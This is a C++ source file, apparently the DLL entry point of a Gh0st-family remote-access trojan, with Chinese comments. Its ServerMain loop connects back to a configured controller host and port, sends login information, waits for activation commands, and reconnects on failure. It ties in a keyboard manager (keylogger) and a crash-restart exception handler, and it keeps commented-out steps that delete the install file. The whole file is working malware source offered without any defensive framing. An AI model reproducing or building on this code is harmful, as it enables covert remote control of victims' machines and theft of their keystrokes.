// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
#include "KeyboardManager/KeyboardManager.h"
#include "KernelManager.h"
#include "Others/login.h"



enum
{
	NOT_CONNECT, //  还没有连接
	GETLOGINFO_ERROR,
	CONNECT_ERROR,
	HEARTBEATTIMEOUT_ERROR
};

//  声明服务器端主函数
UINT WINAPI ServerMain(char *lpServiceName);

//char	svcname[MAX_PATH];
char	chArgList[MAX_PATH];
char	g_szHost[MAX_PATH];	// 保存上线的IP地址
UINT	g_nPort;
DWORD	g_dwServiceType;



/**
 * main函数异常重启处理
 *
 * ExceptionInfo:
 */
LONG WINAPI ExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo)
{
	HANDLE	hThread = DoCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ServerMain, (LPVOID)chArgList, 0, NULL);
	if (INVALID_HANDLE_VALUE != hThread) {
		WaitForSingleObject(hThread, INFINITE);
		CloseHandle(hThread);
		return 0;
	}

	return -1;
}

/**
 * main函数
 *
 * lpServiceName:
 */
UINT WINAPI ServerMain(char *lpServiceName)
{
	char szServiceName[MAX_PATH] = { 0 };
	char szKillEvent[MAX_PATH] = { 0 };
	HANDLE hEvent = NULL;
	CClientSocket socketClient;
	BYTE bBreakError = NOT_CONNECT; // 断开连接的原因,初始化为还没有连接
	HANDLE hInstallMutex = nullptr;

	// Set Window Station
	HWINSTA hOldStation = GetProcessWindowStation();
	HWINSTA hWinSta = OpenWindowStation("winsta0", FALSE, MAXIMUM_ALLOWED);
	if (hWinSta != NULL) {
		SetProcessWindowStation(hWinSta);
	}

	if (CGh0stKeyboardManager::g_hInstance != NULL) {
		// 让程序优雅崩溃
		SetUnhandledExceptionFilter(ExceptionFilter);
		//ResetSSDT();

		lstrcpy(szServiceName, lpServiceName);
		wsprintf(szKillEvent, "Global\\Gh0st %lld", GetTickCount64()); // 随机事件名

		hInstallMutex = CreateMutex(NULL, true, g_szHost);
		//ReConfigService(szServiceName);
		// 删除安装文件
		//DeleteInstallFile(lpServiceName);
	}

	// 告诉操作系统:如果没有找到CD/floppy disc,不要弹窗口吓人
	//SetErrorMode(SEM_FAILCRITICALERRORS);


	while (1) {
		// 如果不是心跳超时，不用再sleep两分钟
		if (bBreakError != NOT_CONNECT && bBreakError != HEARTBEATTIMEOUT_ERROR) {
			// 2分钟断线重连, 为了尽快响应killevent
			for (int i = 0; i < 2000; i++) {
				hEvent = OpenEvent(EVENT_ALL_ACCESS, false, szKillEvent);
				if (hEvent != NULL) {
					socketClient.Disconnect();
					CloseHandle(hEvent);
					break;
				}
				// 改一下
				Sleep(60);
			}
		}

		// 获取要连接的主机及端口
		char *lpszHost = g_szHost;
		UINT nPort = g_nPort;

		//char *lpszProxyHost = NULL;
		//UINT nProxyPort		= 0;
		//char *lpszProxyUser = NULL;
		//char *lpszProxyPass = NULL;
		//if (lpszProxyHost != NULL) {
		//	socketClient.setGlobalProxyOption(PROXY_SOCKS_VER5, lpszProxyHost,
		//									  nProxyPort, lpszProxyUser, lpszProxyPass);
		//} else {
		//	socketClient.setGlobalProxyOption();
		//}

		// 发送连接请求
		ULONGLONG dwTickCount = GetTickCount64();
		if (!socketClient.Connect(lpszHost, nPort)) {
			bBreakError = CONNECT_ERROR;
			continue;
		}

		// 登录
		DWORD dwExitCode = SOCKET_ERROR;
		sendLoginInfo(szServiceName, &socketClient, GetTickCount64() - dwTickCount);
		CKernelManager	manager(&socketClient, szServiceName, g_dwServiceType, szKillEvent, lpszHost, nPort);
		socketClient.setManagerCallBack(&manager);

		//////////////////////////////////////////////////////////////////////////
		// 等待控制端发送激活命令，超时为10秒，重新连接,以防连接错误
		for (int i = 0; (i < 10 && !manager.IsActived()); i++)
		{
			Sleep(1000);
		}
		// 10秒后还没有收到控制端发来的激活命令，说明对方不是控制端，重新连接
		if (!manager.IsActived())
			continue;

		//////////////////////////////////////////////////////////////////////////

		DWORD	dwIOCPEvent;
		dwTickCount = GetTickCount64();

		do
		{
			hEvent = OpenEvent(EVENT_ALL_ACCESS, false, szKillEvent);
			dwIOCPEvent = WaitForSingleObject(socketClient.m_hEvent, 100);
			Sleep(500);
		} while (hEvent == NULL && dwIOCPEvent != WAIT_OBJECT_0);

		if (hEvent != NULL)
		{
			socketClient.Disconnect();
			CloseHandle(hEvent);
			break;
		}
	}
#ifdef _DLL
	//////////////////////////////////////////////////////////////////////////
	// Restor WindowStation and Desktop	
	// 不需要恢复卓面，因为如果是更新服务端的话，新服务端先运行，此进程恢复掉了卓面，会产生黑屏
	// 	SetProcessWindowStation(hOldStation);
	// 	CloseWindowStation(hWinSta);
	//
	//////////////////////////////////////////////////////////////////////////
#endif

	SetErrorMode(0);
	if (NULL != hInstallMutex) {
		ReleaseMutex(hInstallMutex);
		CloseHandle(hInstallMutex);
	}

	return 0;
}




extern "C" __declspec(dllexport) void TestRun(const char *host, unsigned int port)
{
	strcpy_s(g_szHost, host);
	g_nPort = port;

	HANDLE hThread = DoCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ServerMain, (LPVOID)g_szHost, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
}




BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
		CGh0stKeyboardManager::g_hInstance = (HINSTANCE)hModule;
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

